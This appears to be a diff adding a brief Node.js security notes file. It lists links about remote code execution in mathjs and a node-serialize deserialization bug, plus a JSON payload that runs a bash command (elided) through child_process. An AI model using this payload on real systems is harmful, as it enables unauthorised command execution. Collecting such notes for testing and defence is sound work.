@@ -1,0 +1,9 @@
+# nodejs
+
+# rce in mathjs
+https://capacitorset.github.io/mathjs/
+
+# vuln unserialize() in node-serialize
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('bash -c \"bash ...\"')}()"}
+
